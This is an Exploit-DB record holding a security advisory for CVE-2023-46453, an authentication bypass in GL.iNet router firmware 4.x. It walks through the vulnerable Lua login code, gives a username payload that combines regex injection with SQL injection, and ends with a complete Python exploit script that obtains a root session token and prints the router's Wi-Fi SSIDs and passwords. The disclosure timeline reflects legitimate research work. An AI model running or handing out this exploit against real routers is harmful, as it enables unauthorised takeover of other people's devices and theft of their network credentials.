{"source": "https://www.exploit-db.com/exploits/51865", "vulnName": "GLiNet - Router Authentication Bypass", "vulnEDBID": "51865", "vulnCVE": "N/A", "author": "DANIELE LINGUAGLOSSA", "exploitType": "WEBAPPS", "platform": "HARDWARE", "datePublished": "2024-03-06", "vulnContent": "DZONERZY Security Research\n\nGLiNet: Router Authentication Bypass\n\n========================================================================\nContents\n========================================================================\n\n1. Overview\n2. Detailed Description\n3. Exploit\n4. Timeline\n\n========================================================================\n1. Overview\n========================================================================\n\nCVE-2023-46453 is a remote authentication bypass vulnerability in the web\ninterface of GLiNet routers running firmware versions 4.x and up. The\nvulnerability allows an attacker to bypass authentication and gain access\nto the router's web interface.\n\n========================================================================\n2. Detailed Description\n========================================================================\n\nThe vulnerability is caused by a lack of proper authentication checks in\n/usr/sbin/gl-ngx-session file. The file is responsible for authenticating\nusers to the web interface. The authentication is in different stages.\n\nStage 1:\n\nDuring the first stage the user send a request to the challenge rcp\nendpoint. The endpoint returns a random nonce value used later in the\nauthentication process.\n\nStage 2:\n\nDuring the second stage the user sends a request to the login rcp endpoint\nwith the username and the encrypted password. The encrypted password is\ncalculated by the following formula:\n\nmd5(username + crypt(password) + nonce)\n\nThe crypt function is the standard unix crypt function.\n\nThe vulnerability lies in the fact that the username is not sanitized\nproperly before being passed to the login_test function in the lua script.\n\n------------------------------------------------------------------------\nlocal function login_test(username, hash)\n    if not username or username == \"\" then return false end\n\n    for l in io.lines(\"/etc/shadow\") do\n        local pw = l:match('^' .. username .. ':([^:]+)')\n        if pw then\n            for nonce in pairs(nonces) do\n                if utils.md5(table.concat({username, pw, nonce}, \":\")) ==\nhash then\n                    nonces[nonce] = nil\n                    nonce_cnt = nonce_cnt - 1\n                    return true\n                end\n            end\n            return false\n        end\n    end\n\n    return false\nend\n------------------------------------------------------------------------\n\nThis script check the username against the /etc/shadow file. If the username\nis found in the file the script will extract the password hash and compare\nit to the hash sent by the user. If the hashes match the user is\nauthenticated.\n\nThe issue is that the username is not sanitized properly before being\nconcatenated with the regex. This allows an attacker to inject a regex into\nthe username field and modify the final behavior of the regex.\n\nfor instance, the following username will match the userid of the root user:\n\nroot:[^:]+:[^:]+ will become root:[^:]+:[^:]+:([^:]+)\n\n\nThis will match the \"root:\" string and then any character until the next \":\"\ncharacter. This will cause the script skip the password and return the\nuser id instead.\n\nSince the user id of the root user is always 0, the script will always\nreturn:\n\nmd5(\"root:[^:]+:[^:]+\" + \"0\" + nonce)\n\nSince this value is always the same, the attacker can simply send the known\nhash value to the login rcp endpoint and gain access to the web interface.\n\nAnyway this approach won't work as expected since later in the code inside\nthe\nthis check appear:\n\n------------------------------------------------------------------------\n    local aclgroup = db.get_acl_by_username(username)\n\n    local sid = utils.generate_id(32)\n\n    sessions[sid] = {\n        username = username,\n        aclgroup = aclgroup,\n        timeout = time_now() + session_timeout\n    }\n------------------------------------------------------------------------\n\nThe username which is now our custom regex will be passed to the\nget_acl_by_username\nfunction. This function will check the username against a database and\nreturn the aclgroup associated with the username.\nIf the username is not found in the database the function will return nil,\nthus causing attack to fail.\n\nBy checking the code we can see that the get_acl_by_username function is\nactually appending our raw string to a query and then executing it.\nThis means that we can inject a sql query into the username field and\nmake it return a valid aclgroup.\n\n------------------------------------------------------------------------\nM.get_acl_by_username = function(username)\n    if username == \"root\" then return \"root\" end\n\n    local db = sqlite3.open(DB)\n    local sql = string.format(\"SELECT acl FROM account WHERE username =\n'%s'\", username)\n\n    local aclgroup = \"\"\n\n    for a in db:rows(sql) do\n        aclgroup = a[1]\n    end\n\n    db:close()\n\n    return aclgroup\nend\n------------------------------------------------------------------------\n\nUsing this payload we were able to craft a username which is both a valid\nregex and a valid sql query:\n\nroo[^'union selecT char(114,111,111,116)--]:[^:]+:[^:]+\n\nthis will make the sql query become:\n\nSELECT acl FROM account WHERE username = 'roo[^'union selecT\nchar(114,111,111,116)--]:[^:]+:[^:]+'\n\nwhich will return the aclgroup of the root user (root).\n\n========================================================================\n3. Exploit\n========================================================================\n\n------------------------------------------------------------------------\n# Exploit Title: [CVE-2023-46453] GL.iNet - Authentication Bypass\n# Date: 18/10/2023\n# Exploit Author: Daniele 'dzonerzy' Linguaglossa\n# Vendor Homepage: https://www.gl-inet.com/\n# Vulnerable Devices:\n#   GL.iNet GL-MT3000 (4.3.7)\n#   GL.iNet GL-AR300M(4.3.7)\n#   GL.iNet GL-B1300 (4.3.7)\n#   GL.iNet GL-AX1800 (4.3.7)\n#   GL.iNet GL-AR750S (4.3.7)\n#   GL.iNet GL-MT2500 (4.3.7)\n#   GL.iNet GL-AXT1800 (4.3.7)\n#   GL.iNet GL-X3000 (4.3.7)\n#   GL.iNet GL-SFT1200 (4.3.7)\n#   And many more...\n# Version: 4.3.7\n# Firmware Release Date: 2023/09/13\n# CVE: CVE-2023-46453\n\nfrom urllib.parse import urlparse\nimport requests\nimport hashlib\nimport random\nimport sys\n\n\ndef exploit(url):\n    try:\n        requests.packages.urllib3.disable_warnings()\n        host = urlparse(url)\n        url = f\"{host.scheme}://{host.netloc}/rpc\"\n        print(f\"[*] Target: {url}\")\n        print(\"[*] Retrieving nonce...\")\n        nonce = requests.post(url, verify=False, json={\n            \"jsonrpc\": \"2.0\",\n            \"id\": random.randint(1000, 9999),\n            \"method\": \"challenge\",\n            \"params\": {\"username\": \"root\"}\n        }, timeout=5).json()\n        if \"result\" in nonce and \"nonce\" in nonce[\"result\"]:\n            print(f\"[*] Got nonce: {nonce['result']['nonce']} !\")\n        else:\n            print(\"[!] Nonce not found, exiting... :(\")\n            sys.exit(1)\n        print(\"[*] Retrieving authentication token for root...\")\n        md5_hash = hashlib.md5()\n        md5_hash.update(\n            f\"roo[^'union selecT\nchar(114,111,111,116)--]:[^:]+:[^:]+:0:{nonce['result']['nonce']}\".encode())\n        password = md5_hash.hexdigest()\n        token = requests.post(url, verify=False, json={\n            \"jsonrpc\": \"2.0\",\n            \"id\": random.randint(1000, 9999),\n            \"method\": \"login\",\n            \"params\": {\n                \"username\": f\"roo[^'union selecT\nchar(114,111,111,116)--]:[^:]+:[^:]+\",\n                \"hash\": password\n            }\n        }, timeout=5).json()\n        if \"result\" in token and \"sid\" in token[\"result\"]:\n            print(f\"[*] Got token: {token['result']['sid']} !\")\n        else:\n            print(\"[!] Token not found, exiting... :(\")\n            sys.exit(1)\n        print(\"[*] Checking if we are root...\")\n        check = requests.post(url, verify=False, json={\n            \"jsonrpc\": \"2.0\",\n            \"id\": random.randint(1000, 9999),\n            \"method\": \"call\",\n            \"params\": [token[\"result\"][\"sid\"], \"system\", \"get_status\", {}]\n        }, timeout=5).json()\n        if \"result\" in check and \"wifi\" in check[\"result\"]:\n            print(\"[*] We are authenticated as root! :)\")\n            print(\"[*] Below some info:\")\n            for wifi in check[\"result\"][\"wifi\"]:\n                print(f\"[*] --------------------\")\n                print(f\"[*] SSID: {wifi['ssid']}\")\n                print(f\"[*] Password: {wifi['passwd']}\")\n                print(f\"[*] Band: {wifi['band']}\")\n            print(f\"[*] --------------------\")\n        else:\n            print(\"[!] Something went wrong, exiting... :(\")\n            sys.exit(1)\n    except requests.exceptions.Timeout:\n        print(\"[!] Timeout error, exiting... :(\")\n        sys.exit(1)\n    except KeyboardInterrupt:\n        print(f\"[!] Something went wrong: {e}\")\n\n\nif __name__ == \"__main__\":\n    print(\"GL.iNet Auth Bypass\\n\")\n    if len(sys.argv) < 2:\n        print(\n            f\"Usage: python3 {sys.argv[1]} https://target.com\",\nfile=sys.stderr)\n        sys.exit(0)\n    else:\n        exploit(sys.argv[1])\n------------------------------------------------------------------------\n\n========================================================================\n4. Timeline\n========================================================================\n\n2023/09/13 - Vulnerability discovered\n2023/09/14 - CVE-2023-46453 requested\n2023/09/20 - Vendor contacted\n2023/09/20 - Vendor replied\n2023/09/30 - CVE-2023-46453 assigned\n2023/11/08 - Vulnerability patched and fix released\n            "}